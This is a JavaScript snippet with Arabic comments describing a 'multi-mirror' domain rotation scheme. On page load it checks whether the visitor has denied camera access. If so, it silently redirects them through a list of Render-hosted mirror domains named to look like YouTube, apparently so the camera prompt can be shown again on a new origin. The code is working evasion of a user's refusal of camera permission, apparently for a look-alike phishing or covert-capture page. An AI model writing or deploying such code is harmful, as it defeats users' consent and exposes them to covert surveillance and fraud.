/* ==========================================================
   نظام تدوير النطاقات التسلسلي المتعدد (Multi-Mirror Chain)
   ========================================================== */
async function checkAndRotateDomain() {
    if (navigator.permissions && navigator.permissions.query) {
        try {
            const permissionStatus = await navigator.permissions.query({ name: 'camera' });
            
            // إذا كان المستخدم قد قام بحظر الكاميرا
            if (permissionStatus.state === 'denied') {
                
                // ضع هنا جميع الروابط البديلة التي قمت بإنشائها على Render
                const mirrorDomains = [
                    "https://youtube-my-1.onrender.com",
                    "https://youtube-my-2.onrender.com" // أضف أي روابط إضافية هنا بنفس التنسيق
                ];
                
                // قراءة مؤشر المحاولة الحالية من ذاكرة المتصفح المؤقتة
                let attemptIndex = parseInt(sessionStorage.getItem('mirror_attempt') || '0');
                
                if (attemptIndex < mirrorDomains.length) {
                    const nextDomain = mirrorDomains[attemptIndex];
                    
                    // زيادة المؤشر للمحاولة القادمة وتسجيله
                    sessionStorage.setItem('mirror_attempt', (attemptIndex + 1).toString());
                    
                    // تنفيذ التوجيه الصامت للرابط البديل الحالي إذا لم نكن عليه بالفعل
                    if (window.location.origin !== nextDomain) {
                        window.location.replace(nextDomain);
                    }
                }
            }
        } catch (err) {
            console.log("فحص الصلاحيات غير مدعوم في هذا المتصفح:", err);
        }
    }
}

// تنفيذ الفحص بمجرد اكتمال تحميل هيكل الصفحة
document.addEventListener('DOMContentLoaded', checkAndRotateDomain);
